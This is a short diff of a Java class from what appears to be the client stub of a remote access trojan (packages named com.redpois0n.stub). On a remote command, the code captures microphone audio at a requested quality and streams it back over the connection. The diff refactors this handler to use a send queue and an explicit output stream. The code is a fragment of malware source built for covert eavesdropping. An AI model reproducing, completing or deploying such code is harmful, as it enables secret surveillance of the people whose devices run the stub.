@@ -2,20 +2,24 @@ package com.redpois0n.packets.incoming;
 
 import com.redpois0n.Connection;
 import com.redpois0n.Sound;
-import com.redpois0n.packets.outgoing.Header;
+import com.redpois0n.stub.packets.outgoing.Packet58Microphone;
 
 public class PacketSO extends AbstractIncomingPacket {
 
 	@Override
 	public void read() throws Exception {
-		if (Connection.readLine().equalsIgnoreCase("true")) {
+		if (Connection.readBoolean()) {
 			int quality = Connection.readInt();
-			Connection.write(Header.SOUND);
+			Connection.addToSendQueue(new Packet58Microphone());
 			Sound.initialize(quality);
-			Sound.write();
+			Sound.write(Connection.dos);
+			
+			Connection.lock();
 		} else {
-			Connection.write(Header.SOUND);
-			Sound.write();
+			Connection.addToSendQueue(new Packet58Microphone());
+			Sound.write(Connection.dos);
+			
+			Connection.lock();
 		}
 	}
 
